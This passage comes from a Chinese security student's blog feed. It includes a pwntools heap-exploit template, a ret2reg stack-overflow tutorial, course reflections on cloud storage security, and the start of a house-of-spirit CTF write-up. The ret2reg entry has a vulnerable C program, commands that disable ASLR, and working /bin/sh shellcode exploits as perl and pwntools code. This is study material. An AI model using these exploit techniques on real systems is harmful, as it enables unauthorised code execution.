class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">elfPath = <span class=\"string\">&#x27;./pwn&#x27;</span></span><br><span class=\"line\">libcPath = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">remoteAddr = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">remotePort = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.binary = elfPath</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">myelf = context.binary</span><br><span class=\"line\"><span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;l&#x27;</span>:</span><br><span class=\"line\">    sh = process(elfPath)</span><br><span class=\"line\">    libc = myelf.libc</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;d&#x27;</span>:</span><br><span class=\"line\">       sh = process(elfPath, env = &#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>: libcPath&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">       sh = remote(remoteAddr,remotePort)</span><br><span class=\"line\">       context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> libcPath:</span><br><span class=\"line\">       libc = ELF(libcPath)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        libc = myelf.libc</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">sz, content</span>):</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;option:\\n&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;size:\\n&#x27;</span>, <span class=\"built_in\">str</span>(sz))</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;content:\\n&#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;option:\\n&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;id:\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;option:\\n&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    sh.sendlineafter(<span class=\"string\">&#x27;id:\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;a&#x27;</span> ) <span class=\"comment\"># 0</span></span><br><span class=\"line\">    add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;b&#x27;</span> ) <span class=\"comment\"># 1</span></span><br><span class=\"line\">    delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">    gdb.attach(sh)</span><br><span class=\"line\">    add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;c&#x27;</span> * <span class=\"number\">0x1f</span>)</span><br><span class=\"line\">    delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;d&#x27;</span> * <span class=\"number\">0x1f</span>)</span><br><span class=\"line\">    show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.interactive()</span><br><span class=\"line\">    sh.close()</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a href=\"https://www.aucyberclub.org/makaleler/2023/01/31/prototypepollution.html\">https://www.aucyberclub.org/makaleler/2023/01/31/prototypepollution.html</a></p>\n<p><a href=\"https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/calibrator/\">https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/calibrator/</a></p>\n<p>很多题都不错,好好搞一下有空</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/",
            "title": "pwn入门-34-rop之ret2reg",
            "date_published": "2023-07-14T14:06:44.000Z",
            "content_html": "<h1 id=\"手法概述\"><a href=\"#手法概述\" class=\"headerlink\" title=\"手法概述\"></a>手法概述</h1><p>​\t\t这一种攻击手法主要利用的是像如 jmp rsp, jmp rax,call rax这种跳转的指令. 这种指令在一些情况下可以对抗ALSR随机化, 因为比如我们写入一段shellcode,但是不知道shellcode的开始地址,不过,如果有一个寄存器,例如rax,指向shellcode的空间,那么栈溢出后,覆盖返回地址为call rax即可返回到shellcode处进行执行.</p>\n<p>​\t\t主要参考的这一篇文章,利用的这里面的例子,不过在复现的时候,有些地方和文章里有点小区别</p>\n<p>​\t\t<a href=\"https://blog.csdn.net/sinat_35695255/article/details/52031813\">https://blog.csdn.net/sinat_35695255/article/details/52031813</a></p>\n<h1 id=\"漏洞代码\"><a href=\"#漏洞代码\" class=\"headerlink\" title=\"漏洞代码\"></a>漏洞代码</h1><p>ret2reg.c  编译:gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector</p>\n<p>打开ALSR echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span>    </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span>    </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">evilfunction</span><span class=\"params\">(<span class=\"type\">char</span> *input)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> buffer[<span class=\"number\">512</span>];    </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer, input);    </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    evilfunction(argv[<span class=\"number\">1</span>]);    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;    </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"攻击过程\"><a href=\"#攻击过程\" class=\"headerlink\" title=\"攻击过程\"></a>攻击过程</h1><h2 id=\"寻找溢出长度\"><a href=\"#寻找溢出长度\" class=\"headerlink\" title=\"寻找溢出长度\"></a>寻找溢出长度</h2><p>​\t\t可以通过gdb调试,也可以通过参考文章作者给的办法</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./ret2reg $(perl -e <span class=\"string\">&#x27;printf &quot;A&quot;x524 . &quot;BBBB&quot;&#x27;</span>)  </span><br></pre></td></tr></table></figure>\n\n<p>完之后再查看内核崩溃文件,能看到覆盖了返回地址,EIP被设置为BBBB</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714220708831.png\" alt=\"image-20230714220708831\"></p>\n<h2 id=\"寻找gadget\"><a href=\"#寻找gadget\" class=\"headerlink\" title=\"寻找gadget\"></a>寻找gadget</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/ret2reg# objdump  -d ret2reg | grep *%eax</span><br><span class=\"line\">    101d:\tff d0                \tcall   *%eax</span><br><span class=\"line\">    110c:\tff d0                \tcall   *%eax</span><br><span class=\"line\">    </span><br><span class=\"line\">root@vultr:~/ret2reg# ROPgadget --binary ret2reg --only=&quot;call&quot;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000010b6 : call dword ptr [eax + 0x51]</span><br><span class=\"line\">0x000010af : call dword ptr [eax - 0x73]</span><br><span class=\"line\">0x000011f0 : call dword ptr [edx - 0x77]</span><br><span class=\"line\">0x0000101d : call eax</span><br><span class=\"line\">0x0000115d : call edx</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 5</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"寻找shellcode和寄存器的关系\"><a href=\"#寻找shellcode和寄存器的关系\" class=\"headerlink\" title=\"寻找shellcode和寄存器的关系\"></a>寻找shellcode和寄存器的关系</h2><p>​\t\t在strcpy后,shellcode的存放地址,也在了eax中(存放返回值),因为strcpy函数的返回值是指向最终的目标字符串 dest 的指针，所以如果有jmp eax或者call eax，就可以转移控制流过去</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714230359708.png\" alt=\"image-20230714230359708\"></p>\n<h2 id=\"core文件\"><a href=\"#core文件\" class=\"headerlink\" title=\"core文件\"></a>core文件</h2><p>gdb ret2reg core文件 –q 查看内核崩溃文件, 可以看到崩溃时的情况</p>\n<p>那么,linux 程序崩溃 如何产生core呢?</p>\n<p>ulimit查看,如果为0,就不会产生,需要设置一下,</p>\n<p>ulimit -c unlimited 设置为可以产生coredump且大小不受限制,但仅对当前会话?生效,如果想要永久生效,修改&#x2F;etc&#x2F;profile,加入ulimit -c unlimited即可</p>\n<p>参考链接: <a href=\"https://www.tinymind.net.cn/articles/e4c54a679a8b15\">https://www.tinymind.net.cn/articles/e4c54a679a8b15</a></p>\n<p>设置core文件路径:</p>\n<p>proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 可以设置格式化的 core 文件保存位置或文件名 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;/core/core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.ngui.cc/el/1819464.html?action=onClick\">https://www.ngui.cc/el/1819464.html?action=onClick</a></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>​\t\t这里的一个重点是要找call eax的地址,</p>\n<p>​\t\techo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space（作者echo 2, 说是不随机化加载地址,但是我这边随机化了…回头再了解下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; vmmap</span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">     Start        End Perm     Size Offset File</span><br><span class=\"line\"><span class=\"number\">0x56555000</span> <span class=\"number\">0x56558000</span> r-xp     <span class=\"number\">3000</span>      <span class=\"number\">0</span> /root/ret2reg/ret2reg</span><br><span class=\"line\"><span class=\"number\">0x56558000</span> <span class=\"number\">0x56559000</span> r-xp     <span class=\"number\">1000</span>   <span class=\"number\">2000</span> /root/ret2reg/ret2reg</span><br><span class=\"line\"><span class=\"number\">0x56559000</span> <span class=\"number\">0x5655a000</span> rwxp     <span class=\"number\">1000</span>   <span class=\"number\">3000</span> /root/ret2reg/ret2reg</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>​\t0x5655601d</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./ret2reg $(perl -e <span class=\"string\">&#x27;printf &quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot; . &quot;A&quot;x499 .&quot;\\x1d\\x60\\x55\\x56&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t随机化程度有多少呢? 是否可以枚举\t</p>\n<p>​\t\t根据实际情况测试,随机化的大小好像不是很大,可以直接枚举(回头确认下范围)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714220717124.png\" alt=\"image-20230714220717124\"></p>\n<p>​\t\t\t和博客里的那个随机化不一样,博客里说把randomize_va_space设置为2,这里设置为2仍然会随机化,设置为0就都取消了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/ret2reg<span class=\"meta\"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class=\"line\">root@vultr:~/ret2reg# ./ret2reg $(perl -e <span class=\"string\">&#x27;printf &quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot; . &quot;A&quot;x499 .&quot;\\x1d\\x60\\x55\\x56&quot;&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\"># ls</span></span><br><span class=\"line\">core  <span class=\"built_in\">exp</span>.py  ret2reg  ret2reg.c</span><br><span class=\"line\"><span class=\"meta\"># exit</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>​\t\t这里面的三个payload都可以用,本质上没啥区别. 不加架构也能成功,<font color=\"red\">注意需要在启动时就传递参数的话,用这种方式 p &#x3D; process(argv&#x3D;[“.&#x2F;ret2reg”,payload])</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.arch= &#x27;i386&#x27;</span></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\"><span class=\"comment\">#payload = shellcode + b&quot;a&quot;*(524-len(shellcode))+p32(0x5655601d)</span></span><br><span class=\"line\"><span class=\"comment\">#payload = b&quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot;+b&quot;a&quot;*499+p32(0x5655601d)</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80&quot;</span>+<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">499</span>+<span class=\"string\">b&quot;\\x1d\\x60\\x55\\x56&quot;</span></span><br><span class=\"line\">p = process(argv=[<span class=\"string\">&quot;./ret2reg&quot;</span>,payload])</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>参考链接:<a href=\"https://it.cha138.com/jingpin/show-199849.html\">https://it.cha138.com/jingpin/show-199849.html</a></p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>jmp可以吗? jmp是指什么来.. </p>\n<p>call和jmp的区别</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230718213610314.png\" alt=\"image-20230718213610314\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230718213617649.png\" alt=\"image-20230718213617649\"></p>\n<p>2.关于随机化地址的问题</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/",
            "url": "https://tangzichengcc.github.io/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/",
            "title": "ucas-夏季学期-云存储安全和知识图谱",
            "date_published": "2023-06-18T03:20:48.000Z",
            "content_html": "<p>​\t\t夏季学期选课选到了第一周,一周上完,满满的五天课,还是收获了很多的. 首先是这个云计算安全实践(其实是云存储安全实践)做了一个小系统,正好本身打算学c++,这就提前做个小项目了,感觉收获蛮多的. 然后就是知识图谱课程,当初了解知识图谱是导师给我推荐,可以用这个来整理自己的笔记,后来用了用(可能还算不上知识图谱,就是图),确实感觉很不错,因为更符合人的思维习惯我觉得,用图的形式来表达,能够更好地看清事物之间的联系,<font color=\"red\">也有助于建立自己的知识体系!</font>   </p>\n<p>​\t\t不过选了知识图谱这个课程…可能是个错误的选择…真要深入了解的话,隔行如隔山,什么自然语言处理,各种机器学习的东西像听天书一样,听的我头大(头疼),确实不太喜欢这个东西, 不过也反思了一下自己,如果真的有必要去学的话,要克制一下自己的喜好,该学的要学.</p>\n<h1 id=\"云存储安全\"><a href=\"#云存储安全\" class=\"headerlink\" title=\"云存储安全\"></a>云存储安全</h1><p>​\t\t老师它们甚至还写了本书,为了这个课程(或许是有了书才有的课程),这本书里应该把整个系统的实现写的差不多了,代码完成了百分之七八十,所需要的是理解原理,看懂代码,然后进行CV(小小修改)</p>\n<p>​\t\t书籍: 《云存储安全实践》  陈驰老师团队 (微信读书有的)</p>\n<p>​\t\t这个系统主要是实现一个类似云盘功能的东西,然后加入了很多安全的东西,比如三权分立,有账户管理的管理员、有日志管理的管理员、有系统的管理员,然后就是普通用户了. </p>\n<p>​\t\t然后对于核心的用户功能,类似于实现了一个云盘,用户可以上传文件,然后文件是加密传输的,存储到阿里云等公有云上,密钥存储到另外一个云管理平台上,这样就保证了即便数据泄露了,也不会被攻击者轻易得到数据.</p>\n<p>​\t\t前端采用QT框架,利用c++进行开发,后端采用java.</p>\n<p>​\t\t其实没有设计太复杂的编程,本质还是增删改查,融入了一些安全的理念以及云存储的一点功能.(不过不是说这个系统很简单,这个系统确实能学到很多东西)</p>\n<p>​\t\t</p>\n<p>​\t\t以及通过这次实验,让我加深了一个印象,编程不是魔法,没有什么特殊的技巧,更重要的是基础, 尤其是在这次编程中体会到了模版函数等各种机制的利用会带来非常大的便利,比如说很多功能类似的函数,这时候就需要模版函数了,很多复杂的功能,也都是最基本的函数,以及循环、顺序、判断的组合.</p>\n<p>​\t\t</p>\n<p>​\t\t登陆页面:</p>\n<p><img src=\"/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/image-20230618114750123.png\" alt=\"image-20230618114750123\"></p>\n<p>​\t\t用户管理页面:</p>\n<p><img src=\"/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/image-20230618124248050.png\" alt=\"image-20230618124248050\"></p>\n<p>​\t\t文件管理页面:</p>\n<p><img src=\"/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/image-20230618124440319.png\" alt=\"image-20230618124440319\"></p>\n<p>​\t\t搜索功能</p>\n<p><img src=\"/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/image-20230618124453175.png\" alt=\"image-20230618124453175\"></p>\n<h1 id=\"知识图谱\"><a href=\"#知识图谱\" class=\"headerlink\" title=\"知识图谱\"></a>知识图谱</h1><p>​\t\t没什么评价…………..听天书……….</p>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/",
            "title": "pwn入门-33-houseofspirit",
            "date_published": "2023-06-08T12:51:23.000Z",
            "content_html": "<p>​\t\t这个东西蛮有意思,可以对内存中一块fastbin大小的不可控内存区域进行读写,但它需要满足两个条件</p>\n<p>​\t\t1.该区域的前后的内存是可控的</p>\n<p>​\t\t2.存在一个可控指针可以作为free函数的参数</p>\n<h2 id=\"how2heap的例子\"><a href=\"#how2heap的例子\" class=\"headerlink\" title=\"how2heap的例子\"></a>how2heap的例子</h2><p><a href=\"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c\">https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c</a></p>\n<p>确实需要画图,画图的话看得很清晰了就</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608205143594.png\" alt=\"image-20230608205143594\"></p>\n<h2 id=\"LCTF-2016-pwn200\"><a href=\"#LCTF-2016-pwn200\" class=\"headerlink\" title=\"LCTF 2016 pwn200\"></a>LCTF 2016 pwn200</h2><p>​\t\t看一下有rwx段,可以写shellcode,本来是想打onegadget的,不过这种打法还需要泄露libc的地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/heap/houseofsp<span class=\"meta\"># checksec pwn200</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/heap/houseofsp/pwn200&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No <span class=\"title function_\">PIE</span> <span class=\"params\">(<span class=\"number\">0x400000</span>)</span></span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">sub_400A8E</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 i; <span class=\"comment\">// [rsp+10h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v2[<span class=\"number\">48</span>]; <span class=\"comment\">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;who are u?&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0LL</span>; i &lt;= <span class=\"number\">47</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;v2[i], <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2[i] == <span class=\"number\">10</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v2[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s, welcome to xdctf~\\n&quot;</span>, v2);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;give me your id ~~?&quot;</span>);</span><br><span class=\"line\">  sub_4007DF();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sub_400A29();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 